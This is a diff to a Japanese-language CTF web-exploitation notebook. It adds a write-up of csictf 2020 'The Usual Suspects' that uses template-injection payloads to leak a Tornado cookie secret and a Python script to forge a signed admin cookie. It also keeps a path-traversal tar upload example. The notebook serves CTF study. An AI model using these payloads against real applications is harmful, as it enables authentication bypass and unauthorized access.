@@ -38,11 +38,8 @@
   - [Django str.format Information Disclosure (CODEGRAY CTF 2018)](#django-strformat-information-disclosure-codegray-ctf-2018)
   - [jinja2 / LFI / session['']に暗号化鍵で暗号化した値をセット (ASIS_CTF 2017 Golem)](#jinja2--lfi--session%E3%81%AB%E6%9A%97%E5%8F%B7%E5%8C%96%E9%8D%B5%E3%81%A7%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%97%E3%81%9F%E5%80%A4%E3%82%92%E3%82%BB%E3%83%83%E3%83%88-asis_ctf-2017-golem)
   - [Jinja2 bypass "." "_" / (Asis CTF Quals 2019)](#jinja2-bypass--_--asis-ctf-quals-2019)
-  - [bottle / zip slip in tarFile (InterKosenCTF 2020 miniblog)](#bottle--zip-slip-in-tarfile-interkosenctf-2020-miniblog)
   - [sample](#sample)
-  - [Docker環境があるやつ(復習用)](#docker%E7%92%B0%E5%A2%83%E3%81%8C%E3%81%82%E3%82%8B%E3%82%84%E3%81%A4%E5%BE%A9%E7%BF%92%E7%94%A8)
-    - [The Usual Suspects (csictf 2020)](#the-usual-suspects-csictf-2020)
-    - [miniblog (InterKosenCTF 2020)](#miniblog-interkosenctf-2020)
+  - [sample](#sample-1)
 - [メモ](#%E3%83%A1%E3%83%A2)
 - [参考](#%E5%8F%82%E8%80%83)
 
@@ -1331,6 +1328,58 @@ https://alamot.github.io/path_traversal_archiver/
 // 以下で細工したtar.gzファイルを作成してアップロードすると"ls ../"が実行できる
 $ python path_traversal_archiver.py template xxx.tar.gz -l 1
 ```
+## tornado / obtain Cookie's secret_key (csictf 2020 The Usual Suspects)
+https://dunsp4rce.github.io/csictf-2020/web/2020/07/21/The-Usual-Suspects.html   
+- **entrypoint**    
+`?icecream=`のGETの中にバッククォートを挿入するとerrorが返るのでSSTI可能とわかる。Flagが出る条件は`admin`というCookieの値が`false`じゃなくて`true`になることらしいので、SSTIでCookieの暗号化に使われているsecret keyを特定する。   
+- **概要**    
+`?icecream={{globals()}}`を送信するといかが返るのでTornadoとわかる。   
+グローバル名前空間にあるシンボル一覧(変数とかオブジェくトとかメソッドとか？)が返るらしい。   
+```txt
+'application': <tornado.web.Application object at 0x7f2976579750>,
+
+// 他にも以下たちが返るらしい？
+'escape', 'xhtml_escape', 'url_escape', 'json_encode', 'squeeze', 'linkify', 'datetime', '_tt_utf8', '_tt_string_types', '__name__', '__loader__', 'chocolate', 'vanilla', 'butterscotch', 'application', 'secret', '__builtins__', '_tt_execute'
+```
+この中で`application`オブジェクトが怪しいので、`dir(application)`でメンバーを見れるらしい？   
+```txt
+['__call__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_load_ui_methods', '_load_ui_modules', 'add_handlers', 'add_transform', 'default_host', 'default_router', 'find_handler', 'get_handler_delegate', 'listen', 'log_request', 'on_close', 'reverse_url', 'settings', 'start_request', 'transforms', 'ui_methods', 'ui_modules', 'wildcard_router']
+```
+この中で`settings`オブジェクトが怪しいらしいので`{{application.settings}}`で`'cookie_secret': 'MangoDB\n'`が返って秘密鍵がわかる？   
+- **Payload**    
+以下で暗号化したCookieを作成すればOK。   
+```python
+import tornado.ioloop
+import tornado.web
+import time
+
+class User(tornado.web.RequestHandler):
+
+    def get(self):
+        cookieName = "admin"        
+        self.set_secure_cookie(cookieName, 'true')
+
+application = tornado.web.Application([
+    (r"/", User),
+], cookie_secret="MangoDB\n")
+
+if __name__ == "__main__":
+    application.listen(8888)
+    tornado.ioloop.IOLoop.instance().start()
+```
+## sample
+https://dunsp4rce.github.io/HacktivityCon-CTF/web/2020/08/03/Template-Shack.html   
+- **entrypoint**    
+- **概要**    
+- **Payload**    
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
+## sample
+- **entrypoint**    
+- **概要**    
+- **Payload**    
 
 ## sample
 - **entrypoint**    
